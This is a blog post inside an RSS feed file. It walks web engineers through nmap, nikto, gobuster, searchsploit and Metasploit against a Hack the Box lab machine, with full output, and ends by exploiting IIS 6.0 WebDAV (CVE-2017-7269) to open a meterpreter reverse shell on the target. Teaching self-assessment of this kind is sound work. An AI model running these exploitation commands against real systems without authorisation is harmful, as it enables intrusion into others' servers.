@@ -1,0 +1,289 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on @notsag-dev</title>
+        <link>https://notsag-dev.github.io/posts/</link>
+        <description>Recent content in Posts on @notsag-dev</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>☠</copyright>
+        <lastBuildDate>Mon, 21 Sep 2020 04:02:47 -0300</lastBuildDate>
+        <atom:link href="https://notsag-dev.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hacking tools for web engineers</title>
+            <link>https://notsag-dev.github.io/posts/hacking-tools-for-web-engineers/</link>
+            <pubDate>Mon, 21 Sep 2020 04:02:47 -0300</pubDate>
+            
+            <guid>https://notsag-dev.github.io/posts/hacking-tools-for-web-engineers/</guid>
+            <description>We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue Let&amp;rsquo;s encrypt certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be.</description>
+            <content type="html"><![CDATA[<p>We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue <a href="https://letsencrypt.org/">Let&rsquo;s encrypt</a> certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be. But, are they?</p>
+<p>In this post I&rsquo;m going to be walking you through five tools you can easily set up and run in order to test the security of your servers and web applications. Note that the examples listed below are executed against a vulnerable-on-purpose <a href="https://www.hackthebox.eu/">Hack the Box</a> machine referenced by its IP address, but the URL of your site may be used instead.</p>
+<p><strong>Warning:</strong> Some of the listed examples are very intrusive. Be sure to execute them against a local instance of the application or a test environment.</p>
+<h2 id="nmap">Nmap</h2>
+<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
+<p>I discovered this great tool around 12 years ago. I remember it was mind-blowing to me that Ubuntu came with it installed out-of-the-box given the nature of the app! At that point it was the most popular network mapping tool around, and it still holds that position today. It has many capabilities such as host discovery, port scanning, service and OS detection, vulnerability analysis, and much more!</p>
+<p>It is very common to run an nmap scan (or several ones) when approaching a system to get information about the services running on it. Then, depending on the results of the scan, other more specific scans and searches may be executed.</p>
+<p>Example:</p>
+<pre><code>$ nmap -A 10.10.10.14
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 00:06 EDT
+Nmap scan report for 10.10.10.14 (10.10.10.14)
+Host is up (0.16s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Server Date: Tue, 15 Sep 2020 04:13:15 GMT
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Type: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
+</code></pre><p>The <code>-A</code> flag means the scan is aggressive which includes OS detection, service versions detection, and the execution of the default set of scripts. For less intrusive attacks use <code>--script=safe</code> instead. For vulnerability detection (very useful, but more intrusive) use <code>--script=vuln</code>.</p>
+<p>The results show a Windows machine running the Microsoft IIS 6.0 web server on port 80. The next steps will be oriented to collect information about the web server and try to exploit it in order to get access to the system.</p>
+<p>Tip: If nmap indicates the host is down, it may be because the server it is not configured to reply to ping requests. Adding <code>-Pn</code> will launch the scan and ignore the ping check.</p>
+<h2 id="nikto">Nikto</h2>
+<p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
+<p>Nikto is a fantastic web scanner that examins web servers to find software misconfigurations, default/insecure paths available, and vulnerability to attacks such as cross-site scripting and clickjacking, among many others. The solution for some of the vulnerabilities detected by Nikto is as simple as adding a new header to your http responses which may be a neat quick win for your team.</p>
+<p>Example:</p>
+<pre><code>$ nikto -host 10.10.10.14
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.14
++ Target Hostname:    10.10.10.14
++ Target Port:        80
++ Start Time:         2020-09-14 20:55:10 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/6.0
++ Retrieved microsoftofficewebserver header: 5.0_Pub
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 1.1.4322
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Retrieved dasl header: &lt;DAV:sql&gt;
++ Retrieved dav header: 1, 2
++ Retrieved ms-author-via header: MS-FP/4.0,DAV
++ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
++ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
++ WebDAV enabled (SEARCH LOCK PROPFIND MKCOL PROPPATCH UNLOCK COPY listed as allowed)
++ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
++ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
++ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
++ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
++ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
++ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
++ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2020-09-14 21:18:51 (GMT-4) (1421 seconds)
+</code></pre><p>With a pretty simple command execution a lot of information about the web server was retrieved. On the top, information about the web server technologies and the development tools. Then, headers information including missing headers that would allow some kinds of attacks. And finally, warnings about available HTTP methods and interesting files and directories. Note also the OSVDB references, these are known vulnerabilities that are part of a database and their ids may help find further information about them (including exploits).</p>
+<h2 id="gobuster">Gobuster</h2>
+<p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
+<p>Gobuster is a widely-used tool to bruteforce web server paths. It is useful for detecting interesting files and folders that may lead to information disclosure or, even worse, remote code execution. In the example below the <code>common.txt</code> list of paths is used, which can be found as part of the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.</p>
+<p>Example:</p>
+<pre><code>$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --url 10.10.10.14
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.14
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/15 00:33:16 Starting gobuster
+===============================================================
+/Images (Status: 301)
+/_private (Status: 403)
+/_vti_bin (Status: 301)
+/_vti_bin/_vti_adm/admin.dll (Status: 200)
+/_vti_bin/shtml.dll (Status: 200)
+/_vti_cnf (Status: 403)
+/_vti_log (Status: 403)
+/_vti_pvt (Status: 403)
+/_vti_txt (Status: 403)
+/_vti_bin/_vti_aut/author.dll (Status: 200)
+/aspnet_client (Status: 403)
+/images (Status: 301)
+===============================================================
+2020/09/15 00:34:40 Finished
+===============================================================
+</code></pre><p>The result shows which paths were found and their corresponding HTTP status codes. Note that this information complements the already quick path discovery performed by Nikto, getting some new paths this time.</p>
+<p>So, should these paths be visible or not? First of all navigate them, see what information can be obtained from them. Then, for standard paths it will be enough some Googling (or Duckduckgoing) in order to determine if they should be publicly available or not, do your investigation depending on your scan results!</p>
+<h2 id="searchsploit">Searchsploit</h2>
+<p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
+<p>Searchsploit is a great tool for finding available exploits for applications and kernels. If a vulnerable version of an application is being executed on your server, it may be possible for a malicious actor to exploit it to gain access to your data or perform other types of attacks. On the other hand, being able to execute these verifications ourselves is a great skill to have to proactively defend our systems.</p>
+<p>It is worth mentioning that searchsploit works pretty well with Nmap, Nikto and other scanners, as after discovering what services are running on a certain server they can be searched by version number on searchsploit to see if there are any exploits available.</p>
+<p>Example:</p>
+<pre><code>$ searchsploit iis 6.0
+
+------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                             |  Path
+------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure           | windows/remote/21057.txt
+Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                    | windows/remote/9541.pl
+Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                      | windows/dos/9587.txt
+Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                               | windows/dos/3965.pl
+Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)     | windows/dos/15167.txt
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                   | windows/remote/41738.py
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                | windows/remote/8704.txt
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                | windows/remote/8806.pl
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                            | windows/remote/8754.patch
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                              | windows/remote/8765.php
+Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                   | windows/remote/19033.txt
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>This is the result of searching exploits for the IIS 6.0 web server that was detected before using both Nmap and Nikto. It can be appreciated that several exploits were found for this particular version of IIS, having on the left column a short description of the vulnerability, and on the right colum the path of exploits and other files with relevant information.</p>
+<p>Tip: To retrieve the exact location of the exploits or info files on your system, let&rsquo;s say for the first one listed which is <code>windows/remote/21057.txt</code>,  run <code>searchsploit -p windows/remote/21057.txt</code>. If <code>locate</code> is available, <code>locate windows/remote/21057.txt</code> would also work.</p>
+<p><strong>Warning:</strong> Do not just execute exploits if you are not sure about what they do, some of them are harmful. Open the exploit file and see what it does before running it.</p>
+<h2 id="metasploit">Metasploit</h2>
+<p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
+<p>Metasploit is an exploitation framework created by Rapid7. It is widely used by security professionals and also by black-hat hackers, and it simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting, and post-exploiting a system. When it comes to learning resources about this tool, I cannot recommend highly enough <a href="https://www.youtube.com/watch?v=TCPyoWHy4eA&amp;list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_">Hak5&rsquo;s Metasploit Minute</a> and <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik&amp;list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm">HackerSploit&rsquo;s Metasploit videos</a>!</p>
+<p>This example will be a little bit different to the other ones as we will use <em>msfconsole</em>, the Metasploit console, to gain access to the server and pop and actual shell on it. This can be done in less than two minutes by following a few simple steps:</p>
+<ol>
+<li>Search for IIS-related Metasploit modules (similar to searchsploit)</li>
+<li>Select an exploit and set its options</li>
+<li>Run exploit and gain access to the system</li>
+</ol>
+<h3 id="search-for-iis-related-metasploit-modules">Search for IIS-related Metasploit modules</h3>
+<p>Let&rsquo;s use the <code>search</code> command to search for modules that contain the keyword <em>iis</em>:</p>
+<pre><code>msf5 &gt; search iis
+
+Matching Modules
+================
+
+   #   Name                                                             Disclosure Date  Rank       Check  Description
+   -   ----                                                             ---------------  ----       -----  -----------
+   0   auxiliary/admin/appletv/appletv_display_video                                     normal     No     Apple TV Video Remote Control
+   1   auxiliary/admin/http/iis_auth_bypass                             2010-07-02       normal     No     MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
+   2   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                     2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+   3   auxiliary/dos/windows/ftp/iis_list_exhaustion                    2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
+   4   auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                  2010-09-14       normal     No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
+   5   auxiliary/scanner/http/dir_webdav_unicode_bypass                                  normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
+   6   auxiliary/scanner/http/iis_internal_ip                                            normal     No     Microsoft IIS HTTP Internal IP Disclosure
+   7   auxiliary/scanner/http/iis_shortname_scanner                                      normal     Yes    Microsoft IIS shortname vulnerability scanner
+   8   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                             normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
+   9   auxiliary/scanner/http/owa_iis_internal_ip                       2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
+   10  exploit/windows/firewall/blackice_pam_icq                        2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
+   11  exploit/windows/ftp/ms09_053_ftpd_nlst                           2009-08-31       great      No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
+   12  exploit/windows/http/amlibweb_webquerydll_app                    2010-08-03       normal     Yes    Amlibweb NetOpacs webquery.dll Stack Buffer Overflow
+   13  exploit/windows/http/ektron_xslt_exec_ws                         2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
+   14  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
+   15  exploit/windows/iis/iis_webdav_scstoragepathfromurl              2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+   16  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
+   17  exploit/windows/iis/ms01_023_printer                             2001-05-01       good       Yes    MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow
+   18  exploit/windows/iis/ms01_026_dbldecode                           2001-05-15       excellent  Yes    MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
+   19  exploit/windows/iis/ms01_033_idq                                 2001-06-18       good       No     MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
+   20  exploit/windows/iis/ms02_018_htr                                 2002-04-10       good       No     MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
+   21  exploit/windows/iis/ms02_065_msadc                               2002-11-20       normal     Yes    MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow
+   22  exploit/windows/iis/ms03_007_ntdll_webdav                        2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
+   23  exploit/windows/iis/msadc                                        1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
+   24  exploit/windows/isapi/ms00_094_pbserver                          2000-12-04       good       Yes    MS00-094 Microsoft IIS Phone Book Service Overflow
+   25  exploit/windows/isapi/ms03_022_nsiislog_post                     2003-06-25       good       Yes    MS03-022 Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow
+   26  exploit/windows/isapi/ms03_051_fp30reg_chunked                   2003-11-11       good       Yes    MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow
+   27  exploit/windows/isapi/rsa_webagent_redirect                      2005-10-21       good       Yes    Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
+   28  exploit/windows/isapi/w3who_query                                2004-12-06       good       Yes    Microsoft IIS ISAPI w3who.dll Query String Overflow
+   29  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload
+   30  exploit/windows/ssl/ms04_011_pct                                 2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
+</code></pre><p>It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, please take a moment to read through the results. This time the <em>Microsoft IIS WebDav ScStoragePathFromUrl Overflow</em> exploit will be used (search result number 15 on the list), which is related to the <a href="https://www.cvedetails.com/cve/CVE-2017-7269/">CVE-2017-7269</a> vulnerability and it is also know as &ldquo;Exploding Can&rdquo;. Note that, when successful, the execution of this exploit leads to remote code execution.</p>
+<h3 id="select-an-exploit-and-set-its-options">Select an exploit and set its options</h3>
+<p>The <code>use</code> command will be used to select the exploit to be executed, and <code>show options</code> to get the options that have to be set in order to execute it:</p>
+<pre><code>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.8       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+</code></pre><p>The only mandatory option that hasn&rsquo;t been set is <strong>RHOSTS</strong>, and corresponds to the target host (victim). So let&rsquo;s set it to the IP address of the same machine we scanned with the previous tools:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.10.10.14
+RHOSTS =&gt; 10.10.10.14
+</code></pre><h3 id="run-the-exploit-and-gain-access-to-the-system">Run the exploit and gain access to the system</h3>
+<p>A really interesting feature of Metasploit modules is that some of them have a <code>check</code> function to verify if the target host is vulnerable:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; check
+[+] 10.10.10.14:80 - The target is vulnerable.
+</code></pre><p>As the host seems to be vulnerable to this exploit, let&rsquo;s proceed to run it in order to gain access to the server:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.8:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.14.8:4444 -&gt; 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
+</code></pre><p>Boom, we pwned the system! Get some info from it using <code>sysinfo</code> and then open a regular shell:</p>
+<pre><code>meterpreter &gt; sysinfo
+Computer        : GRANPA
+OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter &gt; shell
+
+[-] Failed to spawn shell with thread impersonation. Retrying without it.
+Process 2900 created.
+Channel 10 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv&gt;
+</code></pre><p>And that&rsquo;s it! We got a meterpreter session that remotely controls the victim machine, and we also were able to pop a regular shell on it. A next step would be to gain root access to this computer, but I will leave that one for the next time :)</p>
+<h2 id="summary">Summary</h2>
+<p>On this post we went through a pretty standard security assessment that any web engineer would be able to run. What we did:</p>
+<ol>
+<li>Run an <strong>nmap</strong> scan to discover services running on a server.</li>
+<li>Run a <strong>nikto</strong> scan to evaluate the security of the web server running on port 80 detected by nmap.</li>
+<li>Run a <strong>gobuster</strong> scan in order to list interesting files and folders of the web server.</li>
+<li>Use <strong>searchsploit</strong> to determine if there are any existing exploits for the technologies listed by nmap, nikto and gobuster.</li>
+<li>Use the <strong>metasploit framework</strong> to search for exploits and to gain access to the system.</li>
+</ol>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
